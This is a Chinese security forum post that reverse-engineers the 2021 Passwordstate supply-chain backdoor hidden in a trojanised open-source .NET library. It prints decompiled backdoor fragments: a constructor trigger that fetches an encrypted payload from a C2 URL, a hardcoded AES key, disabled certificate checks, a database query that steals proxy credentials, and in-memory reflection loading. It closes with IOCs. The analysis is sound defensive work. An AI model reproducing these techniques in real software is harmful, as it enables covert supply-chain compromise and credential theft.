---
title: 一个隐藏在开源库中的供应链后门——Passwordstate 供应链攻击事件样本逆向
url: https://forum.butian.net/share/4763
source: 奇安信攻防社区
date: 2026-02-10
fetch_date: 2026-02-11T04:22:58.458087
---

# 一个隐藏在开源库中的供应链后门——Passwordstate 供应链攻击事件样本逆向

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[AI](https://forum.butian.net/AISecurity)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [AI安全](https://forum.butian.net/AISecurity)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一个隐藏在开源库中的供应链后门——Passwordstate 供应链攻击事件样本逆向

* [漏洞分析](https://forum.butian.net/topic/48)

&gt; 2021年4月，企业密码管理软件 Passwordstate 遭遇供应链攻击，攻击者入侵了官方升级服务器，在更新包中植入后门。最近拿到了当时的恶意样本，来分析一下这个后门是怎么藏的、怎么工作的。...

> 2021年4月，企业密码管理软件 Passwordstate 遭遇供应链攻击，攻击者入侵了官方升级服务器，在更新包中植入后门。最近拿到了当时的恶意样本，来分析一下这个后门是怎么藏的、怎么工作的。
- - - - - -
0x00 样本基本信息
-----------
先用 Exeinfo PE 扫一眼：
![8di90ocrpo.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-6d060ae72fb5e9098a09e699843dc6330fe0ceaa.png)
```php
文件名: 1.dll
类型: 32-bit .NET DLL
混淆: DeepSea Obfuscator v4
```
虽然有混淆，但 .NET 程序直接用 dnSpy 打开还是能看的。加载进去看到这样的结构：
![xew99ic8ii.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-365b612b262593c5a68375d2b12f430725a330c2.png)
```php
Moserware.SecretSplitter (0.12.0.0)
├── Loader
│ ├── Container
│ └── Loader
└── Moserware
├── Algebra
├── Numerics
└── Security.Cryptography
```
看起来是个实现 Shamir 秘密共享算法的开源库，GitHub 上能搜到原版。但是多了个 `Loader` 目录...这就有意思了。
- - - - - -
0x01 发现后门入口
-----------
翻了翻代码，在 `Moserware.Security.Cryptography.Diffuser` 这个类里发现了猫腻：
![400tpx4rot.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-e9f110e981771345fd3dfe7b792a10eb1b0c8eea.png)
```vb
Public MustInherit Class Diffuser
Protected Sub New()
Container.Running(
"https://passwordstate-18ed2.kxcdn.com/upgrade\_service\_upgrade.zip",
"f4f15dddc3ba10dd443493a2a8a526b0",
7200000,
"Agent.Agent",
"Invoke"
)
End Sub
End Class
```
好家伙，构造函数里直接调用了 `Container.Running()`，传了一堆参数进去。
这意味着只要有任何代码 new 了一个继承 Diffuser 的类，后门就会被触发。而 Diffuser 是个抽象基类，下面有好几个子类在用，触发条件太容易满足了。
作者选择把恶意代码藏在构造函数里，而不是静态构造函数，说明他不想在程序集加载时就暴露，而是等到真正使用加密功能时才激活。\*\*很狡猾。\*\*
- - - - - -
0x02 后门核心逻辑分析
-------------
跟进 `Loader.Container` 类，这才是重头戏。
### 目标检测
![bzgi9q6tjf.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-d05e61da5af9e5482ef56ba15dc8c2801a6cb8a4.png)
```vb
If Process.GetCurrentProcess().ProcessName.Equals("Passwordstate", StringComparison.OrdinalIgnoreCase) Then
' 只在目标进程中执行
End If
```
只有当宿主进程名是 `Passwordstate` 时才会激活。这是一款商业密码管理软件，看来这个后门是专门针对它的供应链攻击。
在沙箱或者分析环境里跑这个 DLL？抱歉，啥也不干，直接装死。这招能绕过很多自动化分析。
### C2 通信
![gq4j71r9yz.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-99408c5609e30cabc79de548a50570953a5bcdfe.png)
```vb
Private Shared Function [Get](u As String, ...) As Byte()
' 禁用证书验证，方便中间人
ServicePointManager.ServerCertificateValidationCallback = Function(...) True
' 伪装成 Chrome 浏览器
httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."
```
几个关键点：
1. \*\*禁用 SSL 证书验证\*\* - 攻击者可以随时劫持流量
2. \*\*User-Agent 伪装\*\* - 流量看起来像正常浏览器请求
3. \*\*URL 加时间戳\*\* - 绕过缓存，确保每次都能拿到最新 payload
### Payload 解密
![96mgurgot1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-def6b7930a435c8f8ee5f5515f01c7da6ce33180.png)
```vb
Private Shared Function AESDecrypt(B64 As String, Key As String) As Byte()
Return New RijndaelManaged() With {
.Key = Encoding.UTF8.GetBytes(Key),
.Mode = CipherMode.ECB,
.Padding = PaddingMode.PKCS7
}.CreateDecryptor().TransformFinalBlock(...)
End Function
```
从 C2 下载的内容是 Base64 编码的 AES 密文，密钥是硬编码的：
```php
f4f15dddc3ba10dd443493a2a8a526b0
```
用的 ECB 模式，虽然不安全，但对于加载 payload 来说够用了。
### 凭据窃取彩蛋
翻代码的时候还发现个有意思的函数 `GetProxyInfo`：
![virg5nz4ru.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-14b5e239e17ce2c596bfc13a91eba14d034d0b6f.png)
```vb
Dim cmdText As String = "SELECT ProxyServer, ProxyUserName, ProxyPassword FROM [SystemSettings]"
```
后门会尝试从 Passwordstate 的数据库里偷代理配置。如果目标网络需要代理才能出网，后门会自动适配。想得真周到啊...
而且解密代理密码用的是 Passwordstate 自己的解密函数：
```vb
assembly.[GetType]("PasswordstateService.Passwordstate.Crypto").GetMethod("AES\_Decrypt", ...)
```
借刀杀人，妙啊。
- - - - - -
0x03 Payload 执行
---------------
最后看看 `Loader.Loader` 类，负责执行下载的 payload：
![0e4d92ebe8391cfe9eb199066042cace.png](%E5%9B%BE%E7%89%87%E8%A7%A3%E6%9E%90%E4%B8%8A%E4%BC%A0%E5%A4%B1%E8%B4%A5){{{width="auto" height="auto"}}}
```vb
Private Sub ThreadFunc()
Assembly.Load(Me.assemblyData) \_
.[GetType](Me.assemblyType) \_
.GetMethod(Me.assemblyMethod) \_
.Invoke(Nothing, Nothing)
End Sub
```
经典的无文件攻击：
1. `Assembly.Load()` 直接从内存加载程序集
2. 通过反射找到指定的类和方法
3. 调用执行
根据硬编码的参数，它会执行 `Agent.Agent.Invoke()`。整个过程不落地文件，杀软很难检测。
- - - - - -
0x04 攻击流程总结
-----------
```php
Passwordstate 启动
|
v
加载 Moserware.SecretSplitter.dll
|
v
使用加密功能 -> 实例化 Diffuser 子类
|
v
触发构造函数 -> Container.Running()
|
v
检测进程名 == "Passwordstate" ?
|
YES
v
下载 https://passwordstate-18ed2.kxcdn.com/upgrade\_service\_upgrade.zip
|
v
AES 解密 (Key: f4f15dddc3ba10dd443493a2a8a526b0)
|
v
Assembly.Load() 内存加载
|
v
反射调用 Agent.Agent.Invoke()
|
v
每 2 小时循环检查更新
```
- - - - - -
0x05 C2 域名分析
------------
后门中硬编码的回连地址：
```php
https://passwordstate-18ed2.kxcdn.com/upgrade\_service\_upgrade.zip
```
拆解一下这个域名：
| 组成部分 | 说明 |
|---|---|
| `passwordstate` | 伪装成目标软件的官方域名 |
| `18ed2` | 随机字符串，可能用于区分不同攻击批次 |
| `kxcdn.com` | KeyCDN 的 CDN 域名 |
攻击者用 CDN 来托管恶意 payload 有几个好处：
1. \*\*隐藏真实服务器\*\* - CDN 背后的源站 IP 不会直接暴露
2. \*\*提高可用性\*\* - CDN 节点多，不容易被单点屏蔽
3. \*\*流量伪装\*\* - HTTPS + 知名 CDN 域名，看起来像正常业务流量
### 事件背景
这个样本来自 \*\*2021 年 4 月的 Passwordstate 供应链攻击事件\*\*：
- \*\*时间线\*\*: 2021年4月20日 20:33 UTC 至 4月22日 00:30 UTC（约28小时窗口期）
- \*\*攻击方式\*\*: 攻击者入侵了 Passwordstate 的升级服务器，篡改了官方更新包
- \*\*受影响范围\*\*: Passwordstate 被全球约 29,000 家企业使用，包括多家财富500强公司
- \*\*恶意软件名称\*\*: 被安全厂商命名为 \*\*Moserpass\*\*
攻击者把后门代码注入到了合法的开源库 `Moserware.SecretSplitter` 中，然后通过官方升级渠道推送给用户。在那28小时内执行过升级的用户，都中招了。
- - - - - -
0x06 IOCs 汇总
------------
\*\*网络指标:\*\*
```php
域名: passwordstate-18ed2.kxcdn.com
URL: https://passwordstate-18ed2.kxcdn.com/upgrade\_service\_upgrade.zip
```
\*\*加密密钥:\*\*
```php
AES Key: f4f15dddc3ba10dd443493a2a8a526b0
```
\*\*行为特征:\*\*
- 进程名检测: `Passwordstate`
- 禁用 SSL 证书验证
- SQL 查询: `SELECT ... FROM [SystemSettings]`
- 内存加载: `Assembly.Load()` + 反射执行
- 心跳间隔: 7200000ms (2小时)
- - - - - -

* 发表于 2026-02-10 09:54:59
* 阅读 ( 271 )
* 分类：[二进制](https://forum.butian.net/community/erjinzhi)

3 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![bReaK_1](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/28715)

[bReaK\_1](https://forum.butian.net/people/28715)

2 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2026 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![bReaK_1](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---